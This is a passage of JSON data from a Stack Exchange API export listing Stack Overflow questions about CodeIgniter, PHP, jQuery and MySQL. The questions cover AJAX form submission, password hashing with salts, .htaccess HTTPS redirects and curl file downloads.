=&gt; \n        [image_height] =&gt; \n        [image_type] =&gt; \n        [image_size_str] =&gt; \n    )\n\n )\n</code></pre>\n\n<p>Afterwards I tried to see entire uploaded data in an array format. My question is how to get full file path from the above array. I know there is a variable <code>full_path</code> but I am not able to get it. Please help me.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":52,"score":-1,"question_id":13152818,"title":"how to use php code in html?","body":"<p>Its a childish question but i am not getting how to  fix it .I am using html code in php code . It work fine . but when i use php code in that html code it show error . my code is-></p>\n\n<pre><code>$config['full_tag_open'] = '&lt;div class=\"pagination\"&gt; &lt;span class=\"page_no\"&gt;Page 1 of 30&lt;/span&gt; &lt;ul class=\"pag_list\"&gt;';\n</code></pre>\n\n<p>it work fine but i want to use php code in this in place of page 1 of 30. like this-></p>\n\n<pre><code>  $config['uri_segment'] =4;\n\n $config['full_tag_open'] = '&lt;div class=\"pagination\"&gt; &lt;span class=\"page_no\"&gt;Page .\"$config['uri_segment']\". of 30&lt;/span&gt; &lt;ul class=\"pag_list\"&gt;';\n</code></pre>\n\n<p>please help me out . Thanks in Advance.</p>\n"},{"tags":["php","sql","codeigniter","function","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12773564,"title":"Escaping issue in building query dynamic function variables","body":"<p>I am developing a CMS which works on template page system in a different approach.</p>\n\n<p>I have this object:</p>\n\n<pre><code>$structure = new stdClass;\n\n$structure-&gt;homepage-&gt;news-&gt;method            = 'get_articles_by_page_name';\n$structure-&gt;homepage-&gt;news-&gt;lang_key          = translate('home_news');\n$structure-&gt;homepage-&gt;news-&gt;lang              = $lang;\n$structure-&gt;homepage-&gt;news-&gt;add_media         = true;\n$structure-&gt;homepage-&gt;news-&gt;media_type        = 'ibs';\n$structure-&gt;homepage-&gt;news-&gt;limit             = '5';\n$structure-&gt;homepage-&gt;news-&gt;order_by          = 'a.logical_date';\n$structure-&gt;homepage-&gt;news-&gt;asc_des           = 'desc';\n$structure-&gt;homepage-&gt;news-&gt;result_type       = 'result';\n</code></pre>\n\n<p>This helps to get contents as following:</p>\n\n<pre><code>foreach ($structure as $page_template =&gt; $page_contents)\n{\n  // Call Customized Content for Homepage\n  if($this-&gt;data['page_data']-&gt;page_view == $page_template) // homepage comes ok.\n  {\n    foreach ($page_contents as $view_var_name =&gt; $page_cdata)\n    {\n      $method = $page_cdata-&gt;method; // method names comes\n      $page_cdata = substr(implode(\",\",(array) $page_cdata),(strlen($method)+1)) . '\\'';\n      //Returns as expected:\n      //**'Haberler','tr','1','ibs','5','a.logical_date','desc','result'**\n\n      $this-&gt;data[$view_var_name] = $this-&gt;publish-&gt;$method($page_cdata);\n      vdebug($page_cdata);\n    }\n  }\n}\n</code></pre>\n\n<p>It suppose to call them model function of:</p>\n\n<pre><code>function get_articles_by_page_name( $lang_key='',$lang='en',$add_media=true,\n media_type='ibs',$limit='0',$order_by='a.logical_date',$asc_desc='desc',$result_type='result')\n</code></pre>\n\n<p>However, there is a problem with. When I return to last worked query it says:</p>\n\n<pre><code>SELECT * FROM (`page`) JOIN `page_lang` ON `page`.`id_page` = `page_lang`.`id_page` WHERE `page_lang`.`title` = '\\'News\\',\\'tr\\',\\'1\\',\\'ibs\\',\\'5\\',\\'a.logical_date\\',\\'desc\\',\\'result\\''\n</code></pre>\n\n<p>It souldn't be like this. every thing between commas are parameters of the method function. What cause this, any idea?</p>\n\n<p>Content of get_articles_by_page_name:</p>\n\n<pre><code>function get_articles_by_page_name ($lang_key='',$lang='tr',$add_media=true,$media_type='ibs',$limit='0',$order_by='a.logical_date',$asc_desc='desc',$result_type='result')\n{\n  // Define variables\n  $id_page    = ''; \n  $result     = '';\n\n  // Get Page Data\n  $page_name    = $lang_key;\n  $get_page     = $this-&gt;vayes-&gt;getJoined('page','page_lang','id_page','','',array('page_lang.title'=&gt;$page_name),'row');\n  if($get_page)\n  {\n    $id_page  = $get_page-&gt;id_page;\n    $result   = $this-&gt;publish-&gt;get_articles($lang,$id_page,null,false,'',$order_by,$asc_desc,$limit,'result');\n  }\n  else\n  {\n    $result = array('No id_page specified');\n  }\n\n  return $result;\n}\n</code></pre>\n\n<p>Content of get_articles:</p>\n\n<pre><code>function get_articles($lang='tr',$id_page,$id_article=null,$incl_media=true,$media_type='',$order_by='a.logical_date',$asc_desc='desc',$limit='0',$result_type='result')\n{\n  $this-&gt;db-&gt;select('*');\n  $this-&gt;db-&gt;from('article a');\n  $this-&gt;db-&gt;join('article_lang b','b.id_article=a.id_article','left outer');\n\n  if($incl_media) {\n    $this-&gt;db-&gt;join('article_media c','c.id_article=b.id_article','left outer');\n    $this-&gt;db-&gt;join('media d','d.id_media=c.id_media','left outer'); \n  }\n\n  if($id_article == null) { $this-&gt;db-&gt;where('a.id_page',$id_page); }\n  else /*-------------&gt;*/ { $this-&gt;db-&gt;where('a.id_article',$id_article); }\n\n  $this-&gt;db-&gt;where('b.lang',$lang);\n  $this-&gt;db-&gt;where('b.online',1);\n\n  if(($incl_media == true) AND $media_type != '' ) $this-&gt;db-&gt;where('c.usage',$media_type);\n\n  // Order Results\n  $this-&gt;db-&gt;order_by($order_by,$asc_desc);\n\n  // Limit Results\n  if ($limit) $this-&gt;db-&gt;limit($limit);\n\n  $query = $this-&gt;db-&gt;get();\n\n  if($query-&gt;num_rows() &gt; 0)\n  {\n    $result = $query-&gt;$result_type();\n    $query-&gt;free_result();\n    return $result;\n  }\n  return false;\n}\n</code></pre>\n"}]}
{"total":13987,"page":4,"pagesize":100,"questions":[{"tags":["jquery","mysql","ajax","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13151945,"title":"Jquery and ajax form submission to mysql double entries in database","body":"<p>I have this jquery ajax form submitting script which i wrote for creating and editing items in the DB.</p>\n\n<p>The issue is that whenever i create an item 2 items are created.</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    $(document).ready(function() {\n        $('#new_item').on('hidden', function () {\n            $(\".alert\").hide();  // remove errors…when the modal form closes\n        });\n        $(\".showedit\").click(function(){\n            var edit = $(this).attr('id').split(\"_\");// get the edit id\n            var id = edit[1];\n\n            var values = $('#data_'+id+' td').map(function(_, td) {\n                return $(td).text();\n            }).get();\n            // populate the form with the database field\n            var name    = $(\"input[name=name]\").val(values[1]);\n            var model   = $(\"select[name=model]\").val(values[2]);\n            var brand   = $(\"select[name=brand]\").val(values[3]); \n            $('#new_item').modal();\n        });\n\n        $(\"#submit_button\").click(function( e ) {\n            e.preventDefault();\n\n            var name    = $(\"input[name=name]\").val();\n            var amount  = $(\"input[name=amount]\").val();\n            var model   = $(\"select[name=model]\").val();\n            var brand   = $(\"select[name=brand]\").val(); \n\n            $.ajax({            \n                    type: \"POST\",                   \n                    url: \"&lt;?=base_url()?&gt;items/create\",                 \n                    cache: false,\n                    dataType: \"json\",\n                    data: 'name='+name+'&amp;amount='+amount+'&amp;model='+model+'&amp;brand='+brand,\n                    success: function(result){\n                        if(result.error) {\n                            $(\".alert\").addClass('alert-error');\n                            $(\".alert\").fadeIn('slow').html(result.message);\n                          } \n                          else \n                          {                 \n                            $(\".alert\").addClass('alert-success');\n                            $(\".alert\").fadeIn('slow').html(result.message);\n                          }\n\n                    }\n            }); \n\n        });\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>Please help me solve this. I will be greatful!!</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13151494,"title":"Validate password returns 0 rows where expected to get a 1 row","body":"<p>I'm currently making a validation process to check the old password of the user but problem is I can't get it why my query returns zero rows where expected it to have 1 row. 1 more thing is that even I don't convert my password text into md5 the hashed password still get the correct answer and I don't know why it happens. here's my code so far:</p>\n\n<pre><code>public function validate_oldpassword($username,$password)\n    {\n            $this-&gt;db-&gt;select('user_salt');\n            $query = $this-&gt;db-&gt;get_where('login',array('username' =&gt; $username));\n\n            if ($query-&gt;num_rows() == 1)\n            {\n               foreach ($query-&gt;result() as $row)\n               {\n                  $password2 = hash(\"sha256\",$password.$row-&gt;user_salt);\n                  $this-&gt;db-&gt;flush_cache();\n                  $query = $this-&gt;db-&gt;get_where('login', array('username' =&gt; $username, 'password' =&gt; $password2));\n\n                  //return $this-&gt;db-&gt;last_query();\n                  return $query-&gt;num_rows();\n\n                  if($query-&gt;num_rows()==1){\n                    return \"YEHEY\";\n                  }else{\n                    return \"NO\";\n                  }\n\n               }\n            } \n\n    }\n</code></pre>\n\n<p>I also checked the query and it returns the correct query which is:</p>\n\n<pre><code>SELECT * FROM (`login`) WHERE `username` = 'kahel' AND `password` = 'f91d20d381426ea56e57da9ab23d0c568b8f934c3ff313e1bbf6c28a4fee758a'\n</code></pre>\n\n<p>My password is <code>test</code> salt is <code>XgvT7F~(CYr#*0E1^UI@xkqJ5GcAO8BHsotZpf+WQ!4&amp;ja2y%NdelLmhPSnRw9)zDK63VMuib</code> and stored password is <code>f91d20d381426ea56e57da9ab23d0c568b8f934c3ff313e1bbf6c28a4fee758a</code></p>\n\n<p>what bothers me the most is that in my login page function everything works just fine. Here's my login code function:</p>\n\n<pre><code>public function get_login_credentials($username,$password)\n    {\n            $this-&gt;db-&gt;select('user_salt');\n            $query = $this-&gt;db-&gt;get_where('login',array('username' =&gt; $username));\n\n            if ($query-&gt;num_rows() == 1)\n            {\n               foreach ($query-&gt;result() as $row)\n               {\n                  $password = hash(\"sha256\",md5($password).$row-&gt;user_salt);\n                  $query = $this-&gt;db-&gt;get_where('login', array('username' =&gt; $username, 'password' =&gt; $password));\n                  return $query-&gt;num_rows();\n               }\n            } \n    }\n</code></pre>\n\n<p>I can't really figure it out why it returns zero rows.</p>\n"},{"tags":["jquery","codeigniter","hello-world"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":75,"score":-1,"question_id":13137625,"title":"Codeigniter & JQuery Hello world","body":"<p>I cannot get Jquery working in CI.</p>\n\n<p>I downloaded jquery from the official website. Now I have a simple </p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"path_to_jquery\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>and than:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    $(document).ready(\n       function () {\n          alert('The document is ready.');\n       }\n    ); \n&lt;/script&gt; \n</code></pre>\n\n<p>And alert does not show up. So what am I doing wrong..?</p>\n\n<p>All this code is in my 'view'.</p>\n"},{"tags":["php","mysql","codeigniter","where-clause"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":53,"score":3,"question_id":13150500,"title":"WHERE OR clause not working right","body":"<p>I am trying to select categories with certain id's and the sql query is acting really weird, take a look:</p>\n\n<pre><code>  SELECT * FROM (`feeds`) WHERE  `cat_id` =1 OR 2 OR 3 LIMIT 0 , 30\n</code></pre>\n\n<p>The result includes an item with the cat_id of 4, see this picture: </p>\n\n<p><img src=\"http://f.cl.ly/items/3S3T361e3A2t27200a1k/Screen%20Shot%202012-10-30%20at%207.28.23%20PM.png\" alt=\"see here\"></p>\n\n<p>I need this to work, the script does this: a user specify's a country, the script gets all categories with that country id, then the script has to select all feeds with those category ids. The final part is to grab posts with all the feed ids from the previous parts. This is like a news site, the feeds are rss feeds that get imported. ny help would be appreciated! I'm using codeigniter for this, by the way.</p>\n"},{"tags":["php","codeigniter","jquery-ajax"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":13146783,"title":"Populate a div with online users in Codegniter using Ajax call (updated every 10 sec)","body":"<p>I need your help. I need to populate a div with records from my database,every 10 seconds, using Ajax calls. I know i must create a JSON object first, and then pass it to the Ajax function.I was trying for 3 days till i come to request for your help ;))\n<strong>//Updated sourse</strong>\nThe code is below:</p>\n\n<p><strong>Controller</strong></p>\n\n<pre><code>&lt;?php\nif ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass HomePage extends CI_Controller {\n\n    public function index()\n    {\n       $this-&gt;load-&gt;model('home_page_model');\n       $data['query'] = json_encode($this-&gt;home_page_model-&gt;onlineUsers());\n       $this-&gt;load-&gt;view('homepage', $data);\n    }\n    public function AjaxUsers()\n    {\n//When i placed here the following,got an errow about query variable not defined\n//the problem is the $data variable which when not loaded with the view\n//throws en error.I dont know what to do further...\n//$this-&gt;load-&gt;model('home_page_model');\n//$data['query'] = json_encode($this-&gt;home_page_model-&gt;onlineUsers());\n\n    }\n}\n?&gt;\n</code></pre>\n\n<p><strong>Model</strong></p>\n\n<pre><code>&lt;?php\n\n    class home_page_model extends CI_Model {\n        function __construct() {\n            parent::__construct();\n        }\n\n        function onlineUsers() {\n            $this -&gt; db -&gt; select('user_name,status,thumb') -&gt; from('users') -&gt; where('status', 'Online');\n            $query = $this -&gt; db -&gt; get();\n            if ($query -&gt; num_rows &gt; 0) {\n                return $query -&gt; result();\n\n            } else {\n                'There are no results';\n            }   \n        }\n    }\n    ?&gt;\n</code></pre>\n\n<p><strong>And finally my View</strong></p>\n\n<pre><code> &lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n    &lt;head&gt;\n        &lt;meta charset=\"utf-8\"&gt;\n        &lt;title&gt;Welcome!&lt;/title&gt;\n        &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"&lt;?php echo base_url() ?&gt;css/csustyles.css\" /&gt;\n&lt;script type=\"text/javascript\" src=\"https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js\"&gt;&lt;/script&gt;\n\n&lt;script type=\"text/javascript\"&gt;\nsetInterval(function()\n{\n$('.user-records').load('&lt;?php echo base_url()?&gt;index.php/HomePage/');\n}, 1000);\n&lt;/script&gt;\n&lt;/head&gt;\n    &lt;body&gt;\n        &lt;div id=\"container\"&gt;\n            &lt;h1&gt;Welcome to CodeIgniter!&lt;/h1&gt;\n\n&lt;div id=\"body\"&gt;\n&lt;div class=\"user-records\"&gt;&lt;/div&gt;\n&lt;/div&gt;\n    &lt;p class=\"footer\"&gt;\n    Page rendered in &lt;strong&gt;{elapsed_time}&lt;/strong&gt; seconds\n    &lt;/p&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Thanks in advance for  your time teaching me :)</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13150217,"title":"Codeigniter insert failed","body":"<p>I am new to codeigniter. I am trying to insert datat to mysql database to a table named <code>class_record</code>. My controller <code>add_record.php</code> coding as below :</p>\n\n<pre><code>class Add_record extends CI_Controller\n    {\n        function __construct()\n        {\n            parent::__construct();\n        }\n\n        function index()\n        {\n            $this-&gt;load-&gt;model('add_record_model');\n        }\n    }\n</code></pre>\n\n<p>And my model <code>add_record_model</code> is as below :</p>\n\n<pre><code>class add_record_model extends CI_Model{\n\n    function __construct(){\n        parent::__construct();\n    }\n    function index(){\n        $data = array(\n\n            'roll_number' =&gt; 15,\n            'student_name' =&gt; 'Dhrubajyoti Baishya',\n            'branch_code' =&gt; 'CS'\n        );\n\n        $this-&gt;db-&gt;insert('class_record',$data);\n    }\n    }\n</code></pre>\n\n<p>But when I type <code>http://localhost/codeigniter/index.php/add_record</code> in url data are not inserted to the database. What is the problem ?</p>\n"},{"tags":["codeigniter","datamapper","libraries"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13149798,"title":"How do i access (wanwizards) Datamapper from a library in codeigniter?","body":"<p>I have installed Wanwizard's Datamapper (http://datamapper.wanwizard.eu) in an empty codeigniter setup.</p>\n\n<p>I have no problem using datamapper in my controllers, but when I try to call datamapper objects in my libraries. </p>\n\n<p>I get the error: Fatal error: Class 'User' not found.</p>\n\n<p>This is my code for my library:</p>\n\n<pre><code>class Auth {\n\n    protected $ci;\n\n    public function __construct()\n    {\n        $this-&gt;ci =&amp; get_instance();\n        $this-&gt;ci-&gt;load-&gt;library('datamapper');\n    }\n\n    public function signup( $username, $email, $password )\n    {   \n        $user = new User();\n    }\n}\n</code></pre>\n\n<p>Does anyone know the correct way to call these datamapper objects within libraries?</p>\n"},{"tags":["php","codeigniter","curl","stream","get"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13142619,"title":"Using Meetup Stream in PHP to import new events","body":"<p>The meetup API allows you to get pushed data updates. A <code>CURL</code> request that looks as followed:</p>\n\n<pre><code>http://stream.meetup.com/2/open_events\n</code></pre>\n\n<p>Will return a constant stream of updated events. This imported stream just keeps updating as new data is pushed to it. I am trying to think up the best way to work with this stream, and I am not sure what is standard. I was thinking to just run a <code>CURL</code> request within a while loop but that would just run forever and running that from a controller function in my codeigniter project seems impractical. What is the proper way to interface with a seemingly infinite stream of events like this? Is there a better way than running a process from a controller function? Would it be more sensible to run a chron-job that woke up every so often to continue processing from where it left off before? </p>\n\n<p>UPDATE:\nFurther investigation has shown me that importing data from this stream uses chunked-transfer encoding. What is confusing to me is that this stream seems to be infinite. It just keeps outputting data non-stop. I still do not understand how to import data from a stream of data like this. A cron job also does not seem to be the answer for importing a stream like this into my mysql database.</p>\n\n<p>This is a link to the resource that documents the Meetup Stream:\n<a href=\"http://www.meetup.com/meetup_api/docs/stream/2/open_events/\" rel=\"nofollow\">http://www.meetup.com/meetup_api/docs/stream/2/open_events/</a></p>\n\n<p>Thank you for the help.</p>\n"},{"tags":["php","javascript","jquery","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13148101,"title":"best way to add and delete text lines with jquery product configurator","body":"<p>I am creating a product configurator with Jquery. My users can add custom text lines to their product. So you could create say... 4 text lines with custom text.</p>\n\n<p>I need to know what the best way to add and delete these lines would be. Currently I have the following code for adding lines...</p>\n\n<pre><code>    //Add Text Button\n$('a#addText').live('click', function(event) {\n    event.preventDefault();\n\n    //Scroll up the text editor\n    $('.textOptions').slideUp();\n    $('#customText').val('');\n\n    //count how many items are in the ul textList\n    var textItems = $('ul#textList li').size();\n    var nextNumber = textItems + 1;\n\n    if(textItems &lt;= 5) {\n\n        //Change input to reflect current text being changed\n        $('input#currentTextNumber').val(nextNumber);\n\n        //Append a UL Item to the textList\n        $('ul#textList').append('&lt;li id=\"textItem'+nextNumber+'\"&gt;Text Line. +$5.00 &lt;a class=\"deleteTextItem\" href=\"'+nextNumber+'\"&gt;Delete&lt;/a&gt;&lt;/li&gt;');\n\n        //Scroll down the text editor\n        $('.textOptions').slideDown();\n\n    }else {\n\n        alert('you can have a maximum of 6 textual inputs!');   \n\n    }\n});\n</code></pre>\n\n<p>I'm probably not doing this the best way, but basically i have an empty UL list to start with. So when they click \"Add Text Line\" it finds  out how many list elements are in the unordered list, adds a value of 1 to that and places a new list element with the id TextItem1 or TextItem2 or whatever number we're on.</p>\n\n<p>The problem i'm running into is that when you click delete item, it screws everything up because when you add an item again all the numbers aren't correct. I thought about writing some kind of logic that says all the numbers above the one you want deleted get 1 subtracted from their value and all the numbers below stay the same. But I think i'm just going about this the wrong way.</p>\n\n<p>Any suggestions on the easiest way to add and delete these text lines is appreciated.</p>\n"},{"tags":[".htaccess","codeigniter","ssl","https"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13147729,"title":"Codeigniter SSL Certificate Installation - 500 Error when trying to resolve https","body":"<p>I'm having trouble with an SSL certificate on my Codeigniter-based site.</p>\n\n<p>I have checked using two separate \"SSL Checker\" sites that my domain www.example.com has an SSL certificate installed correctly, and it does.</p>\n\n<p>I have modified the config file to this:</p>\n\n<pre><code>$config['base_url'] = 'https://www.example.com/';\n</code></pre>\n\n<p>And my .htaccess file is this:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\nRewriteEngine on\nRewriteBase /\n\n\n#Removes trailing slashes (prevents SEO duplicate content issues)\n#RewriteCond %{REQUEST_FILENAME} !-d\n#RewriteRule ^(.+)/$ $1 [L,R=301]\n\n#forces www.\nRewriteCond %{HTTP_HOST} !^www\\.\nRewriteRule ^(.*)$ https://www.%{HTTP_HOST}/$1 [R=301,L]\n\n\n#If a controller can't be found - then issue a 404 error from PHP\nErrorDocument 404 /404.html\n\n#Removes access to the system folder by users.\n#Additionally this will allow you to create a System.php controller,\n#previously this would not have been possible.\n#'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^sys.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\n# Checks to see if the user is attempting to access a valid file,\n# such as an image or css document, if this isn't true it sends the\n# request to index.php. The first condition allows access to assets, css, js and the robots file\nRewriteCond $1 !^(index\\.php|assets|css|js|robots\\.txt)\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n\nRewriteCond %{THE_REQUEST} ^.*/index.php\nRewriteRule ^(.*)index.php$ https://www.example.com/$1 [R=301,L]\n\n# Removes access to the system folder by users.\n# Additionally this will allow you to create a System.php controller,\n# previously this would not have been possible.\n# 'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n&lt;/IfModule&gt;\n\n\n&lt;IfModule !mod_rewrite.c&gt;\n# Without mod_rewrite, route 404's to the front controller\nErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>All I get is a 500 Internal Server Error when I try to resolve <a href=\"https://www.example.com\" rel=\"nofollow\">https://www.example.com</a>. I want to set the entire site to be protected.</p>\n\n<p>Thanks in advance for any help!</p>\n"},{"tags":["php","codeigniter","url","url-rewriting","codeigniter-url"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13142735,"title":"How todefine function for multiple urls in Codeignitor","body":"<p>I want my Codeigniter to call a function export(...) when</p>\n\n<pre><code>domain.com/foo/bar/show/122.export\n</code></pre>\n\n<p>also the same function if</p>\n\n<pre><code>domain.com/boo/for/show_all/172.export\ndomain.com/goo/par/detail/122.export\n</code></pre>\n\n<p>so I thought I could define that function export(...) only once\nand pass the HTML code of the respective page to the export function, \nor at least the source of the call.</p>\n\n<p>How can I define this for my whole CI-page?</p>\n"},{"tags":["codeigniter","email","smtp","sendgrid","amazon-ses"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":54,"score":4,"question_id":13143444,"title":"How to send emails if your hosting provider does not allow SMTP relay?","body":"<p>I have an application built with CodeIgniter and hosted with a shared hosting provider. </p>\n\n<p>My MX records point to Gmail servers and my app can send emails using Gmail with the standard CodeIgniter e-mail methods.</p>\n\n<p>Now I want to send some transactional mails using SendGrid or Amazon SES. But that does not work and apparently the reason is that my hosting provider does not allow SMTP relaying.</p>\n\n<p>I am thinking of using SendGrid APIs and cURL but I am not sure how well they will work with the CI methods that I am familiar with.</p>\n\n<p>Preferably I would not want to change the MX records that are pointing to Gmail that handles the regular mails for our company.</p>\n\n<p>Given the constraints, is there anything that can be done to send e-mails using SendGrid or Amazon SES?</p>\n"},{"tags":["php","django","authentication","cakephp","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2951,"score":2,"question_id":4246961,"title":"CodeIgniter authentication, permissions and admin system, or any other PHP equivilant of Django?","body":"<p>Reading all about PHP frameworks, CodeIgniter seems really nice in that I like it's speed and raw PHP-ness, but it really misses features that CakePHP has (ACLs, authentication,etc.). I originally thought that it would be ok to write the stuff i needed myself (and CodeIgnitier is definitely the DIY tool), but I'm really missing out on a pre-made thing like that. Is there a PHP-equivilant of Django, but not that extreme, like that provides an admin panel and some automagicness, but is still \"flat-packed\" and doesn't require command line like CodeIgniter does? </p>\n\n<p>Or does anybody know a <em>good</em> module for CodeIgniter to add (1) an admin panel, (2) a login system and (3) a permissions system?</p>\n\n<p>Or should I just shut up and write my own? (I was avoiding this not really because of effort but I'm not sure that I'll write it securely enough or use proper conventions)</p>\n\n<p><strong>Update:</strong> Or should I try and modify a pre-build CMS like PyroCMS to my needs as that is already has built-in authentication and permissions and admin panel, but might be unstable?</p>\n"},{"tags":["codeigniter","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13142995,"title":"CURLOPT_FILE using Curl library","body":"<p>It is posible to download a file using CURLOPT_FILE with Curl (Philip Sturgeon) library?</p>\n\n<p>Right now I'm using, it works but I want to do it with Curl library:</p>\n\n<pre><code>set_time_limit(0);\nini_set('display_errors',true);//Just in case we get some errors, let us know....\n\n$fp = fopen ('/Users/tony/labs/store/'. 'a.mp4', 'w+');//This is the file where we save the information\n$ch = curl_init($previewUrl);//Here is the file we are downloading\ncurl_setopt($ch, CURLOPT_TIMEOUT, 50);\ncurl_setopt($ch, CURLOPT_FILE, $fp);\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);\ncurl_exec($ch);\ncurl_close($ch);\nfclose($fp);\n</code></pre>\n\n<p>I want something like this:</p>\n\n<pre><code>$file = fopen($to, 'w');\n$this-&gt;curl-&gt;create($url);\n$this-&gt;curl-&gt;option('file', $file);\n$this-&gt;curl-&gt;execute();\nfclose($file);\n</code></pre>\n"},{"tags":["codeigniter","facebook-graph-api","facebook-php-sdk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12646394,"title":"Facebook SDK breaking Codeigniter? Blank page","body":"<p>I have tested my login script on my localhost with no problems.</p>\n\n<p>I have now uploaded it online as can be seen at <a href=\"http://www.gua.com/account/login/\" rel=\"nofollow\">this link</a></p>\n\n<p>Obviously if you click, you can see that a blank page is displayed and I have no idea why.</p>\n\n<p>I did a test of a little bit of content, and removed the Facebook SDK code.</p>\n\n<pre><code>        //Facebook config (required for library)\n    $fb_config = array(\n            'appId'  =&gt; 'REMOVED',\n            'secret' =&gt; 'REMOVED'\n            );\n\n    //Load Facebook library\n    $this-&gt;load-&gt;library('facebook', $fb_config);\n\n    //SET FACEBOOK USER \n    $fbuser = array();\n    $fbuser = $this-&gt;facebook-&gt;getUser();\n</code></pre>\n\n<p>When the above code is not present, the page loads.</p>\n\n<p>I have updated my app setting correctly, namely changing the site URL fro <code>http://localhost</code> to <a href=\"http://gua.com\" rel=\"nofollow\">http://gua.com</a> so i dont believe it is that.</p>\n\n<p>I have even changed my CI settings to show all errors - nothing is shown.</p>\n\n<p>Does anyone have any suggestions as to why the above code might be making a blank page load ONLY when it is hosted online?</p>\n\n<p>Many Thanks\nTHomas</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13140057,"title":"get codeigniter page output and place it on non-codeigniter site","body":"<p>Hey guys was hoping you could help me out.</p>\n\n<p>I am working on a site that essentially has two parts, one in codeigniter and one in non-codeigniter(i.e in magento). </p>\n\n<p>I know this is a bad idea to begin with, but too late now.</p>\n\n<p>Now thing is, I need a particular page's output AS-IS from the codeigniter site on the other site (the page is basically a search page). And I need this to be a backend solution for SEO so iframe wont do.</p>\n\n<p>Both sites are hosted on the same domain.</p>\n\n<p>I considered using CURL library to get the output of that page (after sending it post or get) and display it, but I am guessing that would be very inefficient.</p>\n\n<p>Is there any other way?\nThanks in advance.</p>\n"},{"tags":["php","arrays","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":39,"score":-5,"question_id":13139914,"title":"Getting this errors in codeigniter","body":"<blockquote>\n  <h2>A PHP Error was encountered</h2>\n  \n  <p><strong>Severity:</strong> Warning</p>\n  \n  <p><strong>Message:</strong> <code>in_array()</code> expects parameter 2 to be array, boolean given</p>\n  \n  <p><strong>Filename:</strong> models/main_model.php</p>\n  \n  <p><strong>Line Number:</strong> 1386</p>\n</blockquote>\n\n<p>and line number 1386 is :</p>\n\n<pre><code>$pcode_id=$this-&gt;get_postcode_id($value);\n$myarr=unserialize($in_search);\nif(in_array($pcode_id,$myarr)) // line 1386\n{\n    return $myarr;\n}\nelse\n{\n    return false;\n}\n</code></pre>\n\n<p>The result still shows but the error appears.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13134759,"title":"$this->db->_error_number() returning 0 and not the error number","body":"<p>Codeigniter not returning the error number</p>\n\n<pre><code> $this-&gt;db-&gt;trans_start();\n $deal_enquiry = $this-&gt;db-&gt;insert('deal_enquiry', $data);\n $enquiry_id = $this-&gt;db-&gt;insert_id();\n $this-&gt;db-&gt;trans_complete();\n\n if ($this-&gt;db-&gt;trans_status() === FALSE) {\n     echo $this-&gt;db-&gt;_error_number();\n     if ($this-&gt;db-&gt;_error_number() == 0){\n        $errormsg=\"Duplicate entry\";\n        return $errormsg;      \n     } else{\n        $errormsg=\"Enquiry failed\";\n        return $errormsg;      \n     }\n     //    return false;\n } else {\n     return true;\n }\n</code></pre>\n\n<p>The error number is always returning 0 even if there is an error. When i set the db_debug to true the error number is something different. Why am i not getting the correct error number. Can someone please point out the problem.\nThanks,</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13133730,"title":"convert a multiple table query into active record codeigniter","body":"<p>I want to convert a regular multiple table query into active record.</p>\n\n<p>This is my query </p>\n\n<pre><code>  if 